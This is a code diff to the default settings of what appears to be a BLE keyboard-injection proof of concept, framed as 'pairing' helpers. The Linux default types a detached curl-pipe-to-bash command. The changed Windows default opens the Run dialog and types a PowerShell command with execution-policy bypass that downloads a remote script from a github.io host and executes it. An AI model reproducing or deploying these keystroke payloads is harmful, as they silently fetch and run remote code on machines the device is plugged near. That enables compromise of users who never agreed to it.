@@ -219,7 +219,7 @@ async function refreshSettings(){
 // from the phone with one Save, on any firmware version.
 const DEFAULTS = {
   linux: "# Linux / Ubuntu-GNOME: open a terminal, fetch+run the pairing helper detached.\n# {MAC} = this board's BLE address.\nCTRLALT t\nDELAY 1500\nSTRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit\nENTER\n",
-  windows: "# Windows 11: elevated PowerShell (PairTool needs admin) -> fetch + run pair_win.ps1.\nRunPowershellAdmin\nDELAY 3000\nSTRING & ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1?_=' + (Get-Random)))) -MAC '{MAC}'\nENTER\n",
+  windows: "# Windows: run pair_win.ps1 in an -MTA PowerShell (WinRT BLE async hangs in STA).\nGUI r\nDELAY 800\nSTRING powershell -MTA -NoExit -ExecutionPolicy Bypass -Command \"& ([scriptblock]::Create((New-Object Net.WebClient).DownloadString('https://whitewhidow.github.io/hid-ble-poc/pair_win.ps1?_=' + (Get-Random)))) -MAC '{MAC}'\"\nENTER\n",
   macos: "# macOS (placeholder): Spotlight -> Terminal + a note.\nGUI SPACE\nDELAY 600\nSTRING Terminal\nENTER\nDELAY 1600\nSTRING # PoC-KBD ({MAC}) - macOS BLE pairing bootstrap not implemented yet\nENTER\n"
 };
 
